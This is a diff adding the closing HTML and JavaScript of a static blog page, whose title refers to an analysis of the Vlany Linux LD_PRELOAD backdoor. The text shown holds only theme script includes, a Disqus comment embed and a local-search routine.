+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/motto.js"></script>
+
+<script type="text/javascript">
+  new Motto('.title', {
+    lyric: document.querySelector('.title').attributes['data-text'].value,
+    flashSpeed: 200,
+    flashTimeout: 1000
+  });
+</script>
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://kionf-com.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://kionf.com/2018/10/25/rookit-vlany/';
+          this.page.identifier = '2018/10/25/rookit-vlany/';
+          this.page.title = 'Linux动态链接库预加载型后门，Vlany安装及分析';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://kionf-com.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  <script type="text/javascript" src="/js/src/function.js"></script>
+<script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>	
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<script >
+	$(document).ready(
+	function()
+		{			
+			
+		}
+	);	
+</script>
+
+
+
+</body>
+</html>
